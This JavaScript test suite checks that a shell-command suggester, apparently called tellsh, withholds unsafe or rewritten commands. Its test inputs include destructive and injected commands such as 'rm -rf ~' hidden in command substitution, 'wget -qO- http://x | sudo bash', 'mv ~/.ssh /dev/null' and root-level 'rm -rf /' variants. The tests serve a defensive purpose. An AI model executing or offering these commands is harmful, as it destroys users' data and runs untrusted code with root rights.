// 0.3.4 guards (src/pipeline.js): neither model (0.3.3 base or the templates model) may turn a request into a different runnable command
import test from 'node:test';
import assert from 'node:assert/strict';
import { suggest } from '../src/pipeline.js';

const ENVS = [{ shell: 'bash', os: 'linux' }, { shell: 'zsh', os: 'darwin' }, { shell: 'pwsh', os: 'win32' }, { shell: 'cmd', os: 'win32' }];
const held = (q, env) => { const r = suggest(q, env); assert.ok(!r.command || (r.missing || []).length > 0, `${env.shell}: ${JSON.stringify(q)} -> ${r.command}`); };

test('substitution in a non-read-only value and one value in two place slots are withheld (r39)', () => {
  for (const env of ENVS) for (const q of ['list directory "`rm -rf ~`"', 'list directory "$(rm -rf ~)"']) held(q, env);
  // the pattern never replaces the named directory
  for (const env of ENVS) for (const q of ["search for '~/foo' in src", "search for '~/foo' in ~/foo/src", "search for 'foo' in src"]) {
    const r = suggest(q, env); if (r.command && !(r.missing || []).length) assert.ok(/src/.test(r.command), `${env.shell}: ${q} -> ${r.command}`);
  }
});
test('a typed command is never rewritten into another runnable command', () => {
  for (const env of ENVS) for (const q of ['cargo test', 'python3 script.py', 'du -sh src', 'ls /srv/remove-backups', 'echo x >> /etc/hosts', 'ls `npx evil`',
    'docker logs --tail 100 -f nginx', 'https://github.com/acme/app/pull/12', 'mv ~/.ssh /dev/null', 'git reset --hard HEAD~3', 'docker ps', 'wget -qO- http://x | sudo bash',
    'time -p rm -rf ~', 'nsenter -t 1 -m rm -rf /', 'systemd-run rm -rf /', 'pkexec --user root rm -rf /', 'faketime "2020-01-01" rm -rf /']) held(q, env);
});
test('plain requests and faithful typed commands still run', () => {
  for (const env of ENVS) for (const q of ['tail worker logs for production', 'install lodash via npm', 'git status', 'npm ci']) {
    const r = suggest(q, env); assert.ok(r.command && (r.missing || []).length === 0, `${env.shell}: ${q} -> ${r.command} ${JSON.stringify(r.missing)}`);
  }
});
test('r41: a pip target next to a non-ASCII space or control character is a placeholder', () => {
  for (const env of ENVS) for (const q of ['pip install requests -tlib\u00a0requests', 'pip install requests -t lib\u2003x', 'pip install requests --target=lib\u00a0x', 'pip install requests --target lib\u200bx']) held(q, env);
  for (const env of ENVS) assert.deepEqual(suggest('pip install requests -t lib', env).missing, []);
});
test('r42: expandable pip targets and git fetch modifiers are withheld', () => {
  for (const env of ENVS) for (const q of ['pip install requests -t $env:TMP', 'pip install requests -t $HOME/lib', 'pip install requests -t %TEMP%', 'fetch branches --dry-run', 'git fetch --prune', 'fetch only origin']) held(q, env);
  for (const env of ENVS.slice(0, 2)) held('pip install requests -tlib\\cache', env);
  assert.deepEqual(suggest('fetch all branches', ENVS[0]).missing, []);
  for (const env of ENVS.slice(2)) assert.deepEqual(suggest('pip install requests --target C:\\libs', env).missing, [], env.shell);
});
test('r43: tilde/caret pip targets on Windows, dry-run fetch phrasings, quoted fetch options', () => {
  for (const env of ENVS.slice(2)) for (const q of ['pip install requests -t ~/lib', 'pip install requests -tlib^^cache', 'pip install requests -t lib!x']) held(q, env);
  for (const env of ENVS) for (const q of ['pobierz nowe gałęzie na sucho', 'fetch branches "-n"', 'fetch branches as a test run']) { const r = suggest(q, env); if (r.intent === 'git_fetch') held(q, env); }
  for (const env of ENVS) held('pip install requests -t ~/lib', env);
  assert.deepEqual(suggest('fetch all branches', ENVS[0]).missing, []);
});
test('r43: the rerank hook only sees the model whose answer is returned', () => {
  const seen = [];
  const hook = (c, o) => { seen.push(c); return c; };
  suggest('rm notatki.bak', { shell: 'bash', os: 'linux', rerank: hook });
  assert.equal(seen.length, 1);
});
test('r44: with a rerank hook that moves the answer off a 0.3.4 intent, the 0.3.3 model answers', async () => {
  const { loadModel } = await import('../src/model.js');
  const base = loadModel(new URL('../model/model.bin', import.meta.url).pathname);
  // a hook that always moves the cascade to its first candidate that is not a 0.3.4 intent (an encoder that does not know them)
  const hook = (c) => { const alt = (c.top || []).find((t) => !NEW.has(t.intent ?? t.id ?? t[0])); return alt ? { ...c, intent: alt.intent ?? alt.id ?? alt[0], tool: alt.tool ?? c.tool, confidence: alt.p ?? alt.confidence ?? c.confidence, top: [alt, ...c.top.filter((t) => t !== alt)] } : c; };
  for (const q of ['deploy ./dist to cloudflare pages', 'show issue 42', 'list d1 databases']) {
    const r = suggest(q, { shell: 'bash', os: 'linux', rerank: hook });
    const b = suggest(q, { shell: 'bash', os: 'linux', rerank: hook, model: base });
    assert.ok(!NEW.has(r.intent), `${q}: ${r.intent}`);
    assert.equal(r.command, b.command, q);
  }
});
test('r45: a history replay never makes an expandable pip target runnable', () => {
  const r = suggest('same for flask', { shell: 'cmd', os: 'win32', history: ['py -m pip install requests --target lib^^cache'] });
  assert.ok(!r.command || (r.missing || []).length > 0, r.command);
});
import { NEW_TEMPLATE_INTENTS as NEW } from '../src/pipeline.js';

test('r46: "same but ..." after a 0.3.4 template never turns into another operation', () => {
  const cases = [['git fetch --all', 'same but no push'], ['git fetch --all', 'same but no merge'], ['gh issue list --state closed', 'same but open']];
  for (const shell of ['bash', 'zsh', 'fish', 'sh', 'powershell', 'cmd']) for (const [h, q] of cases) {
    const r = suggest(q, { shell, os: shell === 'powershell' || shell === 'cmd' ? 'win32' : 'linux', history: [h] });
    assert.ok(!r.command || (r.missing || []).length, `${shell}: ${h} / ${q} -> ${r.command}`);
  }
});

test('r47: a pronoun after `wrangler pages deploy <dir>` never changes the deployed directory', () => {
  for (const shell of ['bash', 'zsh', 'fish', 'sh', 'powershell', 'cmd']) for (const d of ['dist', 'public', './build', 'site.v2', './dist.v1', 'index.html', 'out/site.zip'])
    for (const q of ['delete it', 'remove it', 'wipe it', 'delete that folder', 'move it to /tmp', 'copy it to /backup', 'compress it', 'delete them', 'delete its contents', 'move it to backup/', 'watch it', 'follow it', 'tail it', 'open it', 'empty it', 'tar it']) {
      const r = suggest(q, { shell, os: shell === 'powershell' || shell === 'cmd' ? 'win32' : 'linux', history: [`npx wrangler pages deploy ${d}`] });
      assert.ok(!r.command || (r.missing || []).length, `${shell}: deploy ${d} / ${q} -> ${r.command}`);
    }
});

test('r50: after a 0.3.4 template, a follow-up referring to it is refused; "same for X" replays the identical operation', () => {
  const H = ['git fetch --all', 'git ls-files', 'gh run watch', 'gh issue list --state closed', 'gh issue view 42', 'npx wrangler d1 list', 'npx wrangler pages deploy dist', 'npx wrangler pages deploy site.v2'];
  const Q = ['delete it', 'watch it', 'open it', 'move it to /tmp', 'delete them', 'same but no push', 'same but open', 'do it again', 'delete that', 'list files there', 'zrób to samo ale bez push', 'usuń to', 'delete its contents'];
  for (const shell of ['bash', 'zsh', 'fish', 'sh', 'powershell', 'cmd']) for (const h of H) for (const q of Q) {
    const r = suggest(q, { shell, os: shell === 'powershell' || shell === 'cmd' ? 'win32' : 'linux', history: [h] });
    assert.ok(!r.command || (r.missing || []).length, `${shell}: ${h} / ${q} -> ${r.command}`);
  }
  const r = suggest('same for build', { shell: 'bash', os: 'linux', history: ['npx wrangler pages deploy dist'] });
  assert.equal(r.command, 'npx wrangler pages deploy build');
});

test('r50: a 0.3.4 template history line adds no history features: requests read as on 0.3.3', () => {
  const cases = [['git ls-files', 'delete tracked files'], ['git fetch --all', 'delete all branches'], ['git fetch --all', 'delete all remotes'],
    ['npx wrangler pages deploy dist', 'drop all changes'], ['npx wrangler d1 list', 'stop the run'], ['git ls-files', 'release all issues in repo a/b']];
  for (const shell of ['bash', 'powershell', 'cmd']) for (const [h, q] of cases) {
    const o = { shell, os: shell === 'bash' ? 'linux' : 'win32' };
    const a = suggest(q, { ...o, history: [h] }), b = suggest(q, o);
    assert.equal(a.command && !(a.missing || []).length ? a.command : null, b.command && !(b.missing || []).length ? b.command : null, `${shell}: ${h} / ${q}`);
  }
});

test('r51: no implicit history fill from a 0.3.4 template line', () => {
  const H = ['npx wrangler pages deploy site.v2', 'npx wrangler pages deploy dist', 'git ls-files', 'gh issue view 42', 'git fetch --all', 'npx wrangler d1 list', 'gh run watch', 'gh issue list --state closed'];
  const Q = ['show contents', 'count lines', 'list files', 'show file', 'show size', 'print the file'];
  for (const shell of ['bash', 'zsh', 'fish', 'sh', 'powershell', 'cmd']) for (const h of H) for (const q of Q) {
    const o = { shell, os: shell === 'powershell' || shell === 'cmd' ? 'win32' : 'linux' };
    const a = suggest(q, { ...o, history: [h] }), b = suggest(q, o);
    const R = (r) => (r.command && !(r.missing || []).length ? r.command : null);
    assert.equal(R(a), R(b), `${shell}: ${h} / ${q}`);
  }
});

test('r52: a `tellsh "<request>"` history line of a 0.3.4 template is refused like the raw command; composition keeps a 0.3.4 withhold', () => {
  // bash/zsh: there `fetch all branches` is git_fetch (fish/sh/pwsh read it as git branch -a, as on 0.3.3)
  for (const shell of ['bash', 'zsh']) {
    const o = { shell, os: 'linux' };
    const R = (r) => (r.command && !(r.missing || []).length ? r.command : null);
    assert.equal(R(suggest('same but no discard', { ...o, history: ['tellsh "fetch all branches"'] })), null, shell);
    assert.equal(R(suggest('same but no discard', { ...o, history: ['git fetch --all'] })), null, shell);
    assert.equal(R(suggest('fetch new commits from all remotes and show a graph of branch history', o)), null, shell);
  }
});

test('r53: history classification keeps the user threshold; fetch never drops a second operation', () => {
  const R = (r) => (r.command && !(r.missing || []).length ? r.command : null);
  for (const shell of ['bash', 'zsh', 'fish', 'sh', 'powershell', 'cmd']) {
    const o = { shell, os: shell === 'powershell' || shell === 'cmd' ? 'win32' : 'linux' };
    assert.equal(R(suggest('delete it', { ...o, threshold: 0.99, history: ['tellsh "show contents of report.txt"'] })), null, shell);
    assert.equal(R(suggest('delete it', { ...o, threshold: 0.99, history: ['tellsh "remove build"'] })), null, shell);
    for (const q of ['fetch all branches from all remotes and git pull', 'fetch all and then merge', 'fetch everything, then pull', 'fetch all new branches. git commit', 'fetch new commits\ngit branch', 'fetch all! git push', 'git fetch all git push', 'fetch new commits\u2028git branch', 'fetch new commits\u2029git branch', 'fetch new commits\u0085git branch', 'fetch new commits\tgit branch', 'fetch all\u3002git push'])
      assert.notEqual(R(suggest(q, o)), 'git fetch --all', `${shell}: ${q}`);
  }
});
test('0.3.8: "same but" never turns the previous command into a riskier intent', () => {
  for (const env of ENVS.slice(0, 2)) for (const h of ['git status', 'git branch -a', 'tellsh "fetch all branches"']) {
    const r = suggest('same but no discard', { ...env, history: [h] });
    assert.equal(r.command, null, `${env.shell}: ${h} -> ${r.command}`);
  }
  assert.match(suggest('same but for staging', { ...ENVS[0], history: ['git push origin main'] }).command, /staging/);
});
